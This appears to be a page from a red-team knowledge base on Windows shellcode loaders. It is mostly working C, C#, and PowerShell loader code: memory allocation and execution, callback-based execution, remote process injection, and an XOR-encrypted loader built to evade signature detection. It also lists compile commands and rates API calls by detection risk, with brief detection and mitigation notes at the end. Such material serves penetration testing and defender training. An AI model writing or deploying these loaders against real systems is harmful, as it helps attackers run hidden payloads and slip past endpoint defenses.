% Filename: 06-red-teaming/initial-access/shellcode-loaders.md
% Display name: Shellcode Loaders
% Last update: 2026-02-11
% ATT&CK Tactics: TA0005 (Defense Evasion), TA0002 (Execution)
% ATT&CK Techniques: T1055 (Process Injection), T1620 (Reflective Code Loading)
% Authors: @TristanInSec

# Shellcode Loaders

## Overview

A shellcode loader is a program that allocates memory, writes shellcode into it, and executes it. Loaders are the bridge between raw shellcode (from msfvenom, Donut, or a C2 framework) and execution on the target. The loader is what AV/EDR actually inspects — the shellcode itself is just data until the loader runs it. Building evasive loaders is the core skill of offensive payload development.

## ATT&CK Mapping

- **Tactic:** TA0005 - Defense Evasion, TA0002 - Execution
- **Techniques:**
  - T1055 - Process Injection
  - T1620 - Reflective Code Loading

## Techniques

### Basic Loader Pattern (Windows)

All Windows shellcode loaders follow the same fundamental pattern:

```text
1. Allocate memory     →  VirtualAlloc / VirtualAllocEx / NtAllocateVirtualMemory
2. Write shellcode     →  memcpy / WriteProcessMemory / NtWriteVirtualMemory
3. Set executable      →  VirtualProtect (if not allocated as RWX)
4. Execute             →  CreateThread / callback function / NtCreateThreadEx
```

### C Loader — VirtualAlloc + CreateThread

```c
// Minimal C shellcode loader
// Compile: x86_64-w64-mingw32-gcc loader.c -o loader.exe -lws2_32

#include <windows.h>

// Replace shellcode[] bytes with msfvenom or donut output
unsigned char shellcode[] = { 0xfc, 0x48, 0x83, /* ... */ };

int main() {
    // 1. Allocate RWX memory
    void *exec = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    // 2. Copy shellcode to allocated memory
    memcpy(exec, shellcode, sizeof(shellcode));

    // 3. Execute via CreateThread
    HANDLE thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec, NULL, 0, NULL);
    WaitForSingleObject(thread, INFINITE);

    return 0;
}
```

### C Loader — Two-Stage Memory Protection

```c
// Avoids RWX allocation (a common detection indicator)
// Allocates as RW, copies shellcode, then changes to RX

#include <windows.h>

unsigned char shellcode[] = { /* ... */ };

int main() {
    // Allocate as RW (not executable yet)
    void *exec = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    memcpy(exec, shellcode, sizeof(shellcode));

    // Change to RX (remove write, add execute)
    DWORD oldProtect;
    VirtualProtect(exec, sizeof(shellcode), PAGE_EXECUTE_READ, &oldProtect);

    // Execute
    HANDLE thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec, NULL, 0, NULL);
    WaitForSingleObject(thread, INFINITE);

    return 0;
}
```

### C# Loader — P/Invoke

```csharp
// C# shellcode loader using P/Invoke
// Compile: csc /unsafe /platform:x64 loader.cs

using System;
using System.Runtime.InteropServices;

class Loader {
    [DllImport("kernel32.dll")]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
        IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    static void Main() {
        // Shellcode — replace with msfvenom -f csharp output
        byte[] shellcode = new byte[] { 0xfc, 0x48, 0x83, /* ... */ };

        IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);
        Marshal.Copy(shellcode, 0, addr, shellcode.Length);

        IntPtr thread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        WaitForSingleObject(thread, 0xFFFFFFFF);
    }
}
```

### PowerShell Loader

```powershell
# PowerShell shellcode loader
# Uses Add-Type for Win32 API access

$code = @"
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
    uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
    IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
[DllImport("kernel32.dll")]
public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
"@
$Win32 = Add-Type -MemberDefinition $code -Name "Win32" -Namespace "Win32Functions" -PassThru

# Shellcode — replace with msfvenom -f powershell output
[Byte[]] $shellcode = 0xfc,0x48,0x83 # ...

$addr = $Win32::VirtualAlloc([IntPtr]::Zero, $shellcode.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $addr, $shellcode.Length)
$thread = $Win32::CreateThread([IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
$Win32::WaitForSingleObject($thread, [uint32]"0xFFFFFFFF")
```

### Callback-Based Execution

Instead of CreateThread, use legitimate Windows API functions that accept a callback pointer:

```c
// Alternative execution methods using callback functions
// These avoid CreateThread, which is heavily monitored

#include <windows.h>

unsigned char shellcode[] = { /* ... */ };

// Method 1: EnumFontsW callback
void exec_via_enumfonts() {
    void *exec = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(exec, shellcode, sizeof(shellcode));
    HDC dc = GetDC(NULL);
    EnumFontsW(dc, NULL, (FONTENUMPROCW)exec, 0);
}

// Method 2: EnumDesktopsA callback
void exec_via_enumdesktops() {
    void *exec = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(exec, shellcode, sizeof(shellcode));
    HWINSTA station = GetProcessWindowStation();
    EnumDesktopsA(station, (DESKTOPENUMPROCA)exec, 0);
}
```

### Process Injection Loader

```c
// Inject shellcode into a remote process
// Avoids running shellcode in the loader's own process

#include <windows.h>

unsigned char shellcode[] = { /* ... */ };

int main() {
    // Find target process (e.g., explorer.exe)
    // In practice, enumerate processes to find PID
    DWORD pid = <target_pid>;

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

    // Allocate memory in remote process
    void *remote_addr = VirtualAllocEx(hProcess, NULL, sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    // Write shellcode to remote process
    WriteProcessMemory(hProcess, remote_addr, shellcode, sizeof(shellcode), NULL);

    // Create remote thread to execute
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
        (LPTHREAD_START_ROUTINE)remote_addr, NULL, 0, NULL);

    CloseHandle(hProcess);
    return 0;
}
```

### Encrypted Shellcode Loader

```c
// XOR-encrypted shellcode loader
// Shellcode is decrypted at runtime to avoid static signature detection

#include <windows.h>

// XOR-encrypted shellcode (encrypt with a script before compiling)
unsigned char enc_shellcode[] = { /* XOR'd bytes */ };
unsigned char key[] = "SecretKey123";

void xor_decrypt(unsigned char *data, int data_len, unsigned char *key, int key_len) {
    for (int i = 0; i < data_len; i++) {
        data[i] ^= key[i % key_len];
    }
}

int main() {
    // Decrypt shellcode in memory
    xor_decrypt(enc_shellcode, sizeof(enc_shellcode), key, sizeof(key) - 1);

    // Allocate and execute
    void *exec = VirtualAlloc(NULL, sizeof(enc_shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    memcpy(exec, enc_shellcode, sizeof(enc_shellcode));

    DWORD oldProtect;
    VirtualProtect(exec, sizeof(enc_shellcode), PAGE_EXECUTE_READ, &oldProtect);

    HANDLE thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec, NULL, 0, NULL);
    WaitForSingleObject(thread, INFINITE);

    return 0;
}
```

### Cross-Compilation from Linux

```bash
# MinGW cross-compiler (pre-installed on Kali)

# Compile C loader for Windows x64
x86_64-w64-mingw32-gcc loader.c -o loader.exe -lws2_32

# Compile C loader for Windows x86
i686-w64-mingw32-gcc loader.c -o loader.exe -lws2_32

# Strip symbols (reduce file size, remove debug info)
x86_64-w64-mingw32-strip loader.exe

# Compile with static linking (no DLL dependencies)
x86_64-w64-mingw32-gcc loader.c -o loader.exe -lws2_32 -static
```

## API Call Summary

```text
API Function              Purpose                    Detection Risk
────────────────────────  ───────────────────────     ──────────────
VirtualAlloc              Allocate memory             Medium
VirtualAllocEx            Allocate in remote proc     High
VirtualProtect            Change memory protection    Medium
WriteProcessMemory        Write to remote process     High
CreateThread              Execute in current proc     Medium
CreateRemoteThread        Execute in remote proc      High
NtAllocateVirtualMemory   Syscall (bypasses hooks)    Low
NtCreateThreadEx          Syscall (bypasses hooks)    Low
```

## Detection Methods

### Host-Based Detection

- RWX memory allocations (PAGE_EXECUTE_READWRITE)
- VirtualAllocEx + WriteProcessMemory + CreateRemoteThread sequence
- Unsigned processes making suspicious API calls
- Memory regions with executable shellcode patterns

### Network-Based Detection

- C2 callback immediately after process start
- Known C2 framework traffic signatures

## Mitigation Strategies

- **EDR with memory scanning** — detect shellcode patterns in allocated memory
- **Code integrity policies** — block unsigned code execution
- **Attack Surface Reduction (ASR)** — block process injection techniques
- **Credential Guard** — protect against credential dumping post-exploitation

## References

### MITRE ATT&CK

- [T1055 - Process Injection](https://attack.mitre.org/techniques/T1055/)
- [T1620 - Reflective Code Loading](https://attack.mitre.org/techniques/T1620/)
